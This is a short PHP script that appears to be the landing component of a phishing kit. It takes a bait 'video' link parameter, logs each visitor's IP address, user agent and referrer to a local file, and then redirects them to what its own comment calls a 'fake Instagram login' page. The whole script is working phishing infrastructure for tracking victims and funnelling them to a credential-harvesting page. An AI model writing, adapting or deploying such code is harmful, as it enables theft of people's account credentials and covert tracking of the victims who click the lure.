<?php

// Get the video parameter (can be used to track which "video" link was clicked)
$video_id = isset($_GET['v']) ? $_GET['v'] : 'default';
$ref = isset($_GET['ref']) ? $_GET['ref'] : 'direct';

// Log the click (optional)
$log_file = "clicks_log.txt";
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date("Y-m-d H:i:s");
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$log_entry = "[{$timestamp}] Video: {$video_id} | Ref: {$ref} | IP: {$ip} | UA: {$user_agent}\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Redirect to fake Instagram login
header("Location: login.html");
exit();

?>
